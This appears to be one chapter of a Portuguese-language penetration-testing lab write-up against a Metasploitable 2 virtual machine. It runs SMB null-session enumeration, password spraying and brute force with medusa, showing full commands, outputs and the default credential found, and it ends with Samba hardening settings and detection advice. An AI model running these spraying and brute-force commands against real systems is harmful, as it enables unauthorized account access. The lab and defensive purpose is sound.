# 04 — SMB: enumeração e password spraying

## O protocolo

O SMB (Server Message Block) é usado para compartilhamento de arquivos, impressoras e autenticação em redes Windows. No Metasploitable 2, o serviço é fornecido pelo **Samba 3.0.20**, uma versão antiga com configuração permissiva.

## 1. Enumeração

### Compartilhamentos

```bash
smbclient -L //192.168.56.102 -N
```

O parâmetro `-N` tenta autenticação **anônima** (sem senha). Resultado:

```text
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
```

**5 compartilhamentos** foram listados sem nenhuma credencial.

### Usuários

```bash
enum4linux -U 192.168.56.102
```

Resultado: **35 usuários** enumerados, incluindo:

```text
backup, bin, bind, daemon, dhcp, distccd, ftp, games, gnats, irc,
klog, libuuid, list, lp, mail, man, msfadmin, mysql, news, nobody,
postfix, postgres, proftpd, proxy, root, service, sshd, sync, sys,
syslog, telnetd, tomcat55, user, uucp, www-data
```

### Por que a sessão nula é perigosa?

Ela entrega ao atacante uma **lista de usuários válidos**. Com isso, o esforço de força bruta deixa de ser “usuário desconhecido × senha desconhecida” e passa a ser “usuário conhecido × senha”. É metade do caminho.

## 2. Password spraying

### Conceito

**Password spraying** testa **uma senha comum** contra **muitos usuários**. É diferente da força bruta tradicional, que testa muitas senhas contra um único usuário.

| Técnica | Padrão | Vantagem para o atacante | Detecção |
|---|---|---|---|
| Força bruta | 1 usuário × N senhas | Encontra senhas complexas se a lista for boa | Muitas falhas no mesmo usuário |
| Spraying | N usuários × 1 senha | Evita bloqueio por conta; passa despercebido | Falhas distribuídas entre contas |

Em ambientes com **bloqueio de conta**, o spraying é especialmente eficaz: cada usuário recebe poucas tentativas, mas vários usuários são testados.

### Comando

```bash
medusa -h 192.168.56.102 \
  -U wordlists/users-smb.txt \
  -p msfadmin \
  -M smbnt \
  -t 1 -f \
  -O logs/04-smb-spray.log
```

| Opção | Função |
|---|---|
| `-U` | Lista de usuários enumerados |
| `-p` | **Uma única senha** (`msfadmin`) |
| `-M smbnt` | Módulo SMB/NTLM do Medusa |
| `-t 1` | Uma thread |
| `-f` | Para na primeira credencial válida |

### Resultado

```text
2026-11-09 18:03:57 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102
  User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

A primeira tentativa já foi bem-sucedida, com acesso ao compartilhamento **`ADMIN$`**.

## 3. Força bruta direcionada

Depois de identificar um usuário válido, o atacante pode concentrar o esforço nele:

```bash
medusa -h 192.168.56.102 \
  -u msfadmin \
  -P wordlists/passwords.txt \
  -M smbnt \
  -t 1 -f \
  -O logs/04-smb-brute.log
```

Resultado: `msfadmin:msfadmin` na **4ª tentativa**.

> Em um ambiente real, essa etapa é arriscada para o atacante: muitas falhas no mesmo usuário podem gerar bloqueio e alertas.

## 4. Validação

```bash
smbclient //192.168.56.102/tmp -U 'msfadmin%msfadmin' -c 'ls'
```

Saída (resumida):

```text
  .                                   D        0  Mon Nov  9 18:03:56 2026
  ..                                  DR        0  Sun May 20 16:36:12 2012
  4569.jsvc_up                        R        0  Mon Nov  9 17:52:45 2026
  .ICE-unix                          DH        0  Mon Nov  9 17:52:09 2026
  .X11-unix                          DH        0  Mon Nov  9 17:52:33 2026
  .X0-lock                           HR       11  Mon Nov  9 17:52:33 2026
```

O acesso ao compartilhamento `/tmp` foi confirmado. O log do Medusa indica ainda permissão em `ADMIN$`, o que amplia o impacto.

## Por que funcionou?

1. **Sessão nula** habilitada → 35 usuários enumerados.
2. **Credencial padrão** `msfadmin:msfadmin`.
3. **Samba antigo** sem políticas de bloqueio.
4. **`ADMIN$` acessível** ao usuário comprometido.
5. **Serviço exposto** na rede host-only sem segmentação.

## Mitigações

### No Samba

```ini
[global]
   server min protocol = SMB2
   restrict anonymous = 2
   map to guest = never
   smb encrypt = required
   server signing = mandatory
```

### No Windows / Active Directory

- Desabilitar **SMBv1**.
- Exigir **SMB signing**.
- Restringir sessões nulas.
- Aplicar **bloqueio de conta** e senhas fortes.
- Remover contas padrão e de serviço não utilizadas.
- Aplicar **menor privilégio** (usuário comum sem `ADMIN$`).
- Usar **LAPS** para senhas de administrador local.
- Monitorar eventos **4625** (logon falho) e **4771** (Kerberos).
- Segmentar SMB e bloquear 139/445 na borda.

### Detectivas

- Alertar quando um mesmo IP falha em **muitos usuários diferentes** (padrão de spraying).
- Correlacionar horários e user-agents.
- Monitorar acesso a `ADMIN$` e `IPC$`.

## Evidências

- Compartilhamentos: [`evidencias/smb/03-smb-shares.txt`](../evidencias/smb/03-smb-shares.txt)
- Usuários: [`evidencias/smb/03-smb-users.txt`](../evidencias/smb/03-smb-users.txt)
- Spraying: [`evidencias/smb/04-smb-spray.log`](../evidencias/smb/04-smb-spray.log)
- Força bruta: [`evidencias/smb/04-smb-brute.log`](../evidencias/smb/04-smb-brute.log)
- Validação: [`evidencias/smb/04-smb-validacao.txt`](../evidencias/smb/04-smb-validacao.txt)
- Capturas: [`07-smb-enum.png`](../evidencias/images/07-smb-enum.png) e [`08-smb-spray.png`](../evidencias/images/08-smb-spray.png)

---

Anterior: [03 — FTP](03-ftp.md) · Voltar ao [README](../README.md) · Próximo: [05 — DVWA](05-dvwa.md)
